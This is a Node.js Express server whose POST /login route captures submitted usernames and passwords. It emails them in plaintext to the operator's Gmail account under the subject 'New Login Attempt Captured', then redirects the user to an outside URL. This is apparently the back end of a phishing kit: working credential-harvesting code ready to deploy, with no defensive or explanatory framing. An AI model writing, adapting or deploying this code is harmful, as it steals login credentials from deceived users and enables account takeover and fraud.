const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const cors = require("cors");

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

// ✅ Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public")); // serve static files

// ✅ Email Transporter Config
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,     // Your Gmail address
    pass: process.env.EMAIL_PASS      // App password (not your real password)
  },
});

// ✅ POST /login Route
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, message: "Missing fields" });
  }

  const mailOptions = {
    from: `"Login Alert" <${process.env.EMAIL_USER}>`,
    to: process.env.EMAIL_USER,
    subject: "🛡️ New Login Attempt Captured",
    text: `📥 Username: ${username}\n🔒 Password: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent successfully");
    return res.json({ success: true, redirect: process.env.REDIRECT_URL });
  } catch (error) {
    console.error("❌ Email sending failed:", error);
    return res.status(500).json({ success: false, message: "Email sending failed" });
  }
});

// ✅ Start Server
app.listen(PORT, () => {
  console.log(`🚀 Server is live on port ${PORT}`);
});
